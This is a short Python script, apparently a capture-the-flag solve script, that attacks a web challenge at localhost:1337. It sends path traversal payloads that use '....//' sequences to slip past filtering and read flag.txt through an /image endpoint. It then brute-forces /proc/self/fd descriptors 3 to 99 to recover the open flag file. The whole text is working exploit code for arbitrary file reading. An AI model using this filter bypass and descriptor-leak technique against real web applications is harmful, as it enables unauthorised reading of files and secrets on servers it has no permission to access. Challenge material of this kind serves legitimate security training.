import requests

url = "http://localhost:1337"

# first open the flag file with /image path
res = requests.get(url+"/image", params={"filename": "....//....//....//....//flag.txt"})
print(res.text)

# because we don't know about the fd number (we bruteforce from 3 to 100)
# just a large number
for i in range(3, 100):
	res = requests.get(url, params={"filename": "....//....//....//....//proc/self/fd/%s" % i})
	if "MOTORI" in res.text:
		print("FLAG: " + res.text)
		break